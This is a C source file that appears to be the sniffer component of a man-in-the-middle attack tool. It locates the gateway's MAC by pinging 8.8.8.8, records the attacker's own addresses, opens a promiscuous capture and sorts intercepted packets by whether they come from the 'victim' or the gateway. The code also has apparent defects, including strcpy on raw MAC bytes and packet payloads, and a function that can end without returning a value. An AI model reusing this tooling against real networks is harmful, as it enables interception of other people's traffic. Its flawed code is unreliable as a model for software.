#include"sniffer.h"
extern bool debug; 
extern bool manual;
//	bool debug;
void getGatewayMAC(u_char* arg,const struct pcap_pkthdr* hp, const u_char* packet){
	sni_info* sni = (sni_info*)arg;
	ethernet_header* eth_header = (ethernet_header*)packet;
	strcpy(sni->gateway_mac,eth_header->SRC_mac);
}
int sniffer_init(sni_info* info,char* errbuf){
	struct in_addr addr_net;
	u_int tmp_mask;
	u_int tmp_net_addr;
	if(pcap_lookupnet(info->dev,&tmp_net_addr,&tmp_mask,errbuf)==-1)return FAIL;
	addr_net.s_addr = tmp_mask;
	info->mask = inet_ntoa(addr_net);
	addr_net.s_addr = tmp_net_addr;
	if(!manual){
		info->handle = pcap_open_live(info->dev,65536,0,1000,errbuf);  //no promiscous mode,or can't get the gateway mac
		if(!info->handle){
			printf("%s\n",errbuf);
			return -1;
		}
		strcpy(info->filter_app,"icmp[icmptype] = icmp-echoreply");
		if(pcap_compile(info->handle,&info->filter,info->filter_app,0,*(info->net))){
			if(debug)printf("%s\n",pcap_geterr(info->handle));
			return -1;
		}
		pcap_setfilter(info->handle,&(info->filter));
		ping("8.8.8.8");
		pcap_loop(info->handle,1,getGatewayMAC,(u_char*)info);
		getAttackerInfo(info->dev,info->attacker_mac,info->attacker_ip);
	
		if(debug){
			printf("the gateway's mac is ");
			print_mac(info->gateway_mac);
			printf("the attacker's mac is ");
			print_mac(info->attacker_mac);
			printf("the attacker's ip is ");
			print_ip(info->attacker_ip);
		}
	}

	info->handle = pcap_open_live(info->dev,65536,1,100,errbuf); // set to promiscous mode to get packet
	return 0;
}

int getPacket(u_char* arg, const struct pcap_pkthdr* hp, const u_char* packet, char* data){
	MITM_info MITM_arg = *(MITM_info*)arg;
	int time =1;
	char* dev = MITM_arg.dev;
	u_short type = EPT_IPv4;
	u_char* victim_MAC = MITM_arg.TARGET_MAC;
	u_char* victim_IP  = MITM_arg.TARGET_IP;
	u_char* gateway_MAC = MITM_arg.GATEWAY_MAC;
	u_char* gateway_IP = MITM_arg.GATEWAY_IP;
	u_char* attacker_MAC = MITM_arg.ATTACKER_MAC;

	/* get packet info */
	ethernet_header* pEther = (ethernet_header*)packet;
	ip_header* pIPv4 = (ip_header*)(packet+14);
	tcp_header* pTCP = (tcp_header*)(packet+34);
	//char* data = (char*)(packet+54);
	strcpy(data,(char*)(packet+54));
	/* get packet from victim */
	// this condition maybe mean that thist function 
	// just only care the packet which source mac is equal victim mac or gateway mac
	if(!memcmp(pEther->SRC_mac,victim_MAC,6)){  
		return FromVictim;
	//	char* p = strstr(data,"HTTP");
	//	if(p)printf("%s\n",data);
	//	forword(); //victim  -> gateway
	}else if(!memcmp(pEther->SRC_mac,gateway_MAC,6)){
		return FromGateway;
	//	forword(); //gateway -> victim
	}
}
